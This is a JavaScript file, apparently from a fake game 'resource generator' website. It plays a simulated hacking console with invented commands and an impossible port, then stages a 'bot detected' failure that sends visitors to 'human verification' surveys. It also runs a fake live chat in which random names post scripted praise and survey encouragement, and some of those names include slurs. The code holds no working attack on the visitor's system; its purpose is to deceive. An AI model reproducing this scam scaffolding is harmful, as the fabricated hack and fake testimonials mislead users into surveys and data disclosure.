					placeholder: '<span class="console_text white">',
					render_strategy: 'text-by-char',
					items: "open_ssl_connection " + game_name + " -s 28.3.4.53.2 -deobfuscate -encrypt_aes_256"
				},
				{
					delay: 200
				},
				{
					animation: 'additive',
					delay: 5,
					placeholder: '<span class="console_text blue">',
					render_strategy: 'text-one-shot',
					items: "\nOpening port 423245.\n"
				},
				{
					animation: 'replace',
					delay: 3,
					placeholder: '<span class="console_text yellow">',
					render_strategy: 'iterator',
					items: $().dynatexer.helper.counter({
						start: 1,
						end: 100,
						step: 1,
						mask: '%d%'
					})
				},
				{
					animation: 'additive',
					delay: 50,
					placeholder: '<span class="console_text green">',
					render_strategy: 'text-one-shot',
					items: "\nPort 423245 opened successfully."
				},
				{
					animation: 'additive',
					delay: 50,
					placeholder: '<span class="console_text blue">',
					render_strategy: 'text-one-shot',
					items: "\nEncrypting connection: open_ssl_aes256(28.3.4.53.2);\n"
				},
				{
					animation: 'replace',
					delay: 10,
					render_strategy: 'iterator',
					placeholder: '<span class="console_text yellow">',
					items: $().dynatexer.helper.counter({
						start: 1,
						end: 100,
						step: 1,
						mask: '%d%'
					})
				},
				{
					animation: 'additive',
					delay: 50,
					placeholder: '<span class="console_text green">',
					render_strategy: 'text-one-shot',
					items: "\nConnection encrypted successfully."
				},
				{
					animation: 'additive',
					delay: 0,
					placeholder: '<span class="console_text white">',
					render_strategy: 'text-one-shot',
					items: "\n[root@28.3.4.53.2]$ "
				},
				{
					animation: 'additive',
					delay: 5,
					placeholder: '<span class="console_text white">',
					render_strategy: 'text-by-char',
					items: "import server files /usr/ect/kernel/server/config.json"
				},
				{
					delay: 100
				},
				{
					animation: 'additive',
					delay: 5,
					placeholder: '<span class="console_text blue">',
					render_strategy: 'text-one-shot',
					items: "\nImporting config.json\n"
				},
				{
					animation: 'replace',
					delay: 5,
					placeholder: '<span class="console_text yellow">',
					render_strategy: 'iterator',
					items: $().dynatexer.helper.counter({
						start: 1,
						end: 100,
						step: 1,
						mask: '%d%'
					})
				},
				{
					animation: 'additive',
					delay: 5,
					placeholder: '<span class="console_text green">',
					render_strategy: 'text-one-shot',
					items: "\n‘config.json’ file has been imported successfully."
				},
				{
					animation: 'additive',
					delay: 5,
					placeholder: '<span class="console_text blue">',
					render_strategy: 'text-one-shot',
					items: "\nDe-obfuscating server config files.\n"
				},
				{
					animation: 'replace',
					delay: 3,
					placeholder: '<span class="console_text yellow">',
					render_strategy: 'iterator',
					items: $().dynatexer.helper.counter({
						start: 1,
						end: 100,
						step: 1,
						mask: '%d%'
					})
				},
				{
					animation: 'additive',
					delay: 5,
					placeholder: '<span class="console_text green">',
					render_strategy: 'text-one-shot',
					items: "\nFiles de-obfuscated successfully."
				},
				{
					animation: 'additive',
					delay: 5,
					placeholder: '<span class="console_text blue">',
					render_strategy: 'text-one-shot',
					items: "\nDecrypting server configuration files.\n"
				},
				{
					animation: 'replace',
					delay: 5,
					placeholder: '<span class="console_text yellow">',
					render_strategy: 'iterator',
					items: $().dynatexer.helper.counter({
						start: 1,
						end: 100,
						step: 1,
						mask: '%d%'
					})
				},
				{
					animation: 'additive',
					delay: 30,
					placeholder: '<span class="console_text green">',
					render_strategy: 'text-one-shot',
					items: "\nConfigurations files are now imported and readable."
				},
				{
					animation: 'additive',
					delay: 0,
					placeholder: '<span class="console_text white">',
					render_strategy: 'text-one-shot',
					items: "\n[root@28.3.4.53.2]$ "
				},
				{
					animation: 'additive',
					delay: 5,
					placeholder: '<span class="console_text white">',
					render_strategy: 'text-by-char',
					items: "edit_config -platform " + $('#platform').val() + " " + items
				},
				{
					delay: 70
				},
				{
					animation: 'additive',
					delay: 5,
					placeholder: '<span class="console_text blue">',
					render_strategy: 'text-one-shot',
					items: "\nOpen server configurations files in edit mode.\n"
				},
				{
					animation: 'replace',
					delay: 3,
					placeholder: '<span class="console_text yellow">',
					render_strategy: 'iterator',
					items: $().dynatexer.helper.counter({
						start: 1,
						end: 100,
						step: 1,
						mask: '%d%'
					})
				},
				{
					animation: 'additive',
					delay: 5,
					placeholder: '<span class="console_text green">',
					render_strategy: 'text-one-shot',
					items: "\nConfigurations files is now open in edit mode."
				},
				{
					animation: 'additive',
					delay: 5,
					placeholder: '<span class="console_text blue">',
					render_strategy: 'text-one-shot',
					items: "\nChange items.\n"
				},
				{
					animation: 'replace',
					delay: 4,
					placeholder: '<span class="console_text yellow">',
					render_strategy: 'iterator',
					items: $().dynatexer.helper.counter({
						start: 1,
						end: 100,
						step: 1,
						mask: '%d%'
					})
				},
				{
					animation: 'additive',
					delay: 10,
					placeholder: '<span class="console_text green">',
					render_strategy: 'text-one-shot',
					items: "\nItems changed successfully."
				},
				{
					animation: 'additive',
					delay: 3,
					placeholder: '<span class="console_text blue">',
					render_strategy: 'text-one-shot',
					items: "\nClose configuration file.\n"
				},
				{
					animation: 'replace',
					delay: 3,
					placeholder: '<span class="console_text yellow">',
					render_strategy: 'iterator',
					items: $().dynatexer.helper.counter({
						start: 1,
						end: 100,
						step: 1,
						mask: '%d%'
					})
				},
				{
					animation: 'additive',
					delay: 10,
					placeholder: '<span class="console_text green">',
					render_strategy: 'text-one-shot',
					items: "\nConfiguration file is now closed."
				},
				{
					animation: 'additive',
					delay: 0,
					placeholder: '<span class="console_text white">',
					render_strategy: 'text-one-shot',
					items: "\n[root@28.3.4.53.2]$ "
				},
				{
					animation: 'additive',
					delay: 5,
					placeholder: '<span class="console_text white">',
					render_strategy: 'text-by-char',
					items: "save_config -S -v /usr/ect/kernel/sever/config.json"
				},
				{
					delay: 80
				},
				{
					animation: 'additive',
					delay: 5,
					placeholder: '<span class="console_text blue">',
					render_strategy: 'text-one-shot',
					items: "\nExporting temporary configuration file to main server.\n"
				},
				{
					animation: 'replace',
					delay: 3,
					placeholder: '<span class="console_text yellow">',
					render_strategy: 'iterator',
					items: $().dynatexer.helper.counter({
						start: 1,
						end: 100,
						step: 1,
						mask: '%d%'
					})
				},
				{
					animation: 'additive',
					delay: 5,
					placeholder: '<span class="console_text red">',
					render_strategy: 'text-one-shot',
					items: "\nFailed to export configuration file, bot detected."
				},
				{
					animation: 'additive',
					delay: 5,
					placeholder: '<span class="console_text blue">',
					render_strategy: 'text-one-shot',
					items: "\nTrying again to export configuration files.\n"
				},
				{
					animation: 'replace',
					delay: 4,
					placeholder: '<span class="console_text yellow">',
					render_strategy: 'iterator',
					items: $().dynatexer.helper.counter({
						start: 1,
						end: 100,
						step: 1,
						mask: '%d%'
					})
				},
				{
					animation: 'additive',
					delay: 5,
					placeholder: '<span class="console_text red">',
					render_strategy: 'text-one-shot',
					items: "\nFailed to export configuration file, bot detected."
				},
				{
					animation: 'additive',
					delay: 5,
					placeholder: '<span class="console_text blue">',
					render_strategy: 'text-one-shot',
					items: "\nTrying one last time to export configuration files.\n"
				},
				{
					animation: 'replace',
					delay: 5,
					placeholder: '<span class="console_text yellow">',
					render_strategy: 'iterator',
					items: $().dynatexer.helper.counter({
						start: 1,
						end: 100,
						step: 1,
						mask: '%d%'
					})
				},
				{
					animation: 'additive',
					delay: 10,
					placeholder: '<span class="console_text red">',
					render_strategy: 'text-one-shot',
					items: "\nExport failed, anti-human verification system detected potential bot."
				},
				{
					animation: 'additive',
					delay: 10,
					placeholder: '<span class="console_text yellow">',
					render_strategy: 'text-one-shot',
					items: "\nPlease submit your code for human verification."
				},
			],
			cursor: {
				animation: 'replace',
				loop: 'infinite',
				delay: 500,
				placeholder: '<span class="console_cursor">',
				render_strategy: 'array-items',
				items: ['|', '']
			}
		});

		$('#generator-console').dynatexer('play', function() {
			callback();
		});
    $('#generator-console').on('DOMSubtreeModified', function(){
  		$("#generator-console").scrollTop($("#generator-console")[0].scrollHeight);
  	});
		/* END CONSOLE ANIMATION */
    }

    /*
     * Live Chat
     */

    var livechat_name = '';

    var livechat_text_area = $('.livechatListArea');
    var livechat_text_list = $('.chatList');
    var livechat_text_area_height = livechat_text_area.height();

    var name_colors = ['#d4a112', '#987c2f', '#b02643', '#d72248', '#9d22d7', '#a65fc7', '#2771bc', '#1a82ed', '#28ba4a', '#136b28', '#9bc716'];

    var chat_names = ['Richard23', 'Philip', 'Rob001', 'Hill213', 'Prim', 'Grequod', 'Moseeld30', 'Allichere', 'Munplad60', 'Therainged', 'Perseent', 'Wasice59', 'Arrent', 'Quot1991', 'Yourlenis', 'leon wilkins', 'William Chemini', 'GamingFrog', 'Darknight92', 'TimmyTechTV', 'Kyranio', 'urmaker', 'Forexalised', 'pishbot', 'Rory Mag', 'Rasmus krüger', 'SniperNator', 'PieTries', 'Chris G', 'Suman Yadav', 'iRider', 'TehGreatFred', 'Arda Incegoz', 'Triplequake I', 'Fuck LoL', 'The Golden Fish', 'Great White', 'Riptide', 'TSUNAMI', 'Bruhh', 'noobpie', 'TheLiberalMachine', 'Gregory Stork', 'Noi5ee', 'Zealox Gaming', 'FIGHTTHECABLE', 'CulinaryWord1', 'HowToCompute101', 'Complexity', 'Crysis', 'Inception', 'The Joker', 'Cameron Foord', 'steinke24', 'Daire Kerin', 'Jgs92692', 'WanoLiano', 'racialmilk', '://Reaper', 'VFXI', 'Valy Hitmanu', 'Macafoni', 'MultiDeivas', 'whitneythesharky', 'Krosis Lockwood', 'Linus Puehler', 'Aurelius R', 'Wesley Williams', 'tegra2016', 'Drew-Drew Bear', 'Freeza Fish', 'Bad_Gamer -DK', 'OtakuGaijin85', 'Dennis Hui', 'London Claborn', 'Sean Williams', 'The Raging Stallion', 'AlgaeEater08', 'Arsenio Allison', 'Liofa', 'Kevon', 'NiggaFrom Paris', 'KanyeBest', 'nerd Mike', 'Strider Inc', 'Борко', 'Mike bak', 'Alejoxon_YT', 'Axle'];

    var chat_messages = ["Awesome,its rare to find working generator like this one","Anyone tried this already?","Does it work in NA?","Why this is so easy lol?","This is incredible, never thought it would work.","I get Resource in a minute.","shy i see survey ?","its to protect from spamming, first try to use, i got no Survey request, but for second try i need to get Finish 1 Survey","OMG!","LOL!","ROFL!","Real","gayyyy","easy","bro","What can I do here?","Shut up man I love this website","hi guys","How much resource you've generated so far?","what about surveys on mobile phone?","Is this free?","How long do you have to wait?","Yea","No","I know","Exactly why this is so good","uhm","maybe","I can imagine this must be annoying for the one who play with skill","Is this ban secure?","Thanks man I appreciate this.","Cool =)","<message deleted>","oh god","damn","I love this","Never imagined this would work but damn its so simple","saw this on forums pretty impressive","yo guys dont spam okay?","anyone up for a game?","you think this will be patched any time soon","pretty sure this is saving me a lot of money","any idea which skin i should get","so happy i found this","you guys watch nightblue?","I have seen this generator on hotshot stream i think","just wow","When do I get my resource ??","a friend told me about this","thanks to whoever spams this website Finish my survey now","how can finish this survey quickly?","so far I am cool with this generaor","can I get off this survey easily?","bye guys, already finish my survey, and resources generated successfully","okay i am stacked now with survey","finished survey is easy, if you fill using valid data","incredible","three minutes ago cannot get fast resource, now i have and its works perfectly","need to go now","brb","You should give it a try","dont regret being here","fucking generator is real","first time ever this makes sense","Does everyone have a different survey ","got my resource in 5 minutes only :D","what happen after finish a survey","after finish a survey you'll get the resiurce ","today is lucky day","this is the best generator because we all have more than a chance","i think everyone can do a survey quickly","can we get more than one survey ?, first time success, and want to try for my sister account","yes","abselutely","I got all resource for my girlfriend too"];

    setInterval(function(){
        add_livechat_msg(chat_names[getRandomInt(1, chat_names.length - 1)], name_colors[getRandomInt(1, name_colors.length - 1)], chat_messages[getRandomInt(1, chat_messages.length - 1)]);
    }, getRandomInt(1500, 6000));


    $('.livechatSubmtBtn').click(function(){
        if(livechat_name == '') {
            $('.livechatNameBox').show();
        } else {
            add_livechat_msg(livechat_name, '#136b28', $('.livechatMsg').val());
            $('.livechatMsg').val('');
        }
    });

    $('.livechatNicknameBtn').click(function(){
        var name_input = $('#livechat_name');
        if(name_input.val() != '') {
            livechat_name = name_input.val();
            $(this).parents('.livechatNameBox').hide();
        } else {
            sweetAlert("Error", "Please enter a nickname.", "error");
        }
    });

    $( ".livechatName" ).on( "keypress", function() {
        console.log( "Handler for .keypress() called." );
    });

    function add_livechat_msg(name, color, msg) {
        var $output_text = $('<li><span class="name" style="color: ' + color + ' !important;">' + name + '</span>: <span class="message">' + msg + '</span></li>');
        $output_text.hide().appendTo(livechat_text_list).fadeIn();
        livechat_text_area.animate({scrollTop: livechat_text_area_height}, 500);
        livechat_text_area_height += livechat_text_area.height();
    }


    function getRandomInt(min, max) {
		return Math.floor(Math.random() * (max - min + 1)) + min;
	}

});
